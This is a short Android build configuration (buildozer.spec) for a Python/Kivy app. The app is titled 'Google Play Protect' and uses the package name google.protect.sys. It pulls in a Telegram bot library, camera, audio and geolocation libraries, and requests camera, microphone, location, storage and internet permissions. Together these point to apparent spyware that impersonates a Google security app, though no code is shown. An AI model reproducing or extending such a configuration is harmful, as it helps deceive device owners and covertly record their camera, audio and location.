[app]
title = Google Play Protect
package.name = google.protect.sys
package.domain = org.google.service
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 2.0
requirements = python3,kivy==2.2.1,pyTelegramBotAPI,opencv-python,jnius,sounddevice,scipy,geopy

android.permissions = INTERNET, CAMERA, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
android.api = 33
android.minapi = 21
android.ndk = 25b
android.accept_sdk_license = True
